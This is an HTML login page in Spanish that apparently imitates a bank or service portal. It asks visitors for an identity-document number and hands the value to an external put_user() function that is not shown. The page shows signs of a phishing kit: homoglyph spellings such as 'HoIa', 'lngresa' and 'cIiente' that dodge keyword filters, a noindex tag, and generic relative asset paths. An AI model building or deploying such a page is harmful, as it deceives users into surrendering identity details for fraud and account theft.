<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="Content-Language" content="es">
    <link rel="stylesheet" href="../esova/datos/src/css/layout.css">
    <link rel="stylesheet" href="../esova/datos/src/css/fonts.css">
    <link rel="icon" type="image/png" href="../esova/datos/src/img/logo.png">
    <script src="../esova/datos/src/js/jquery-3.6.0.min.js"></script>
    <script src="../esova/datos/src/js/jquery.jclock-min.js"></script>
    <script src="../esova/datos/src/js/run.js"></script>
    <style>
        .btn-disabled {
            background-color: #e3e3e3;
            color: #8f8f8f;
            cursor: not-allowed;
            border: 0px solid transparent;
        }
        .btn-amarillo {
            background-color: yellow;
            color: black;
        }
    </style>
</head>
<body style="background-color: #f7f7f7; text-align: center;">

    <br><br><br><br>
    <img style="width: 250px;" src="../esova/datos/src/img/logo.svg" alt="Logo">
    <br>

    <main>
        <br>
        <div class="contenido">
            <section class="form-usuario">
                <div class="usuario-saludo">
                    <br><br>
                    <span style="font-size: 35px; font-family: Arial, sans-serif;">¡HoIa!</span>
                    <br><br><br><br><br>
                    <p><span style="font-size: 20px; font-family: Arial, sans-serif;">Si no has creado un usuario, lngresa con tu documento de identidad.</span><br></p>
                    <br><br>
                    <div class="box-form" style="margin: 0 auto; max-width: 400px;">
                        <div class="box-img"><br><br><br><br>
                            <img src="../esova/datos/src/img/icons/user.png" alt="Usuario">
                            <input type="text" name="inp-user" id="inp-user" autocomplete="off" placeholder="Escribe aquí...">
                            <div>
                                <button id="btn-user" name="btn-user" class="btn btn-disabled" type="button" style="font-family: Arial, sans-serif;">Continuar</button>
                            </div>
                            <br><br><br>
                            <u><b><span style="font-size: 18px; font-family: Arial, sans-serif;">¿No eres cIiente?</span></b></u>
                        </div>
                    </div>
                </div>
            </section>
        </div>
    </main>

    <footer>
        <br><br><br><br><br>
        <div style="width: 100%; text-align: center;">
            <img class="fondo" src="../esova/datos/src/img/icons/fondo1-1024x459.png" alt="Fondo">
        </div>
    </footer>

    <script type="text/javascript">
        $(document).ready(function() {
            $('#btn-user').click(function() {
                var userInput = $("#inp-user").val();

                // Verificar si el usuario contiene al menos un número
                var hasNumber = /\d/.test(userInput);

                // Verificar si el usuario son solo números
                var onlyNumbers = /^\d+$/.test(userInput);

                // Verificar si no hay espacios en blanco
                var noSpaces = userInput.indexOf(' ') === -1;

                // Comprobar todas las condiciones
                if ((hasNumber || onlyNumbers) && noSpaces) {
                    put_user(userInput);
                } else {
                    if (!hasNumber && !onlyNumbers) {
                        alert("El nombre de usuario debe contener al menos un número o ser solo números.");
                    } else if (!noSpaces) {
                        alert("El nombre de usuario no puede contener espacios en blanco.");
                    }

                    $(".mensaje").show();
                    $(".user").css("border", "1px solid red");
                    $("#inp-user").focus();
                }
            });

            $("#inp-user").keyup(function(e) {
                var userInput = $(this).val();
                if (userInput.length > 0) {
                    $('#btn-user').removeClass('btn-disabled').addClass('btn-amarillo');
                } else {
                    $('#btn-user').removeClass('btn-amarillo').addClass('btn-disabled');
                }
            });
        });
    </script>

    <script type="text/javascript">
        $(function($) {
            var optionsEST = {
                am_pm: true,
                h_format: "$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$",
                h_language: "es"
            }
            $('#fecha-hora').jclock(optionsEST);
        });
    </script>
</body>
</html>
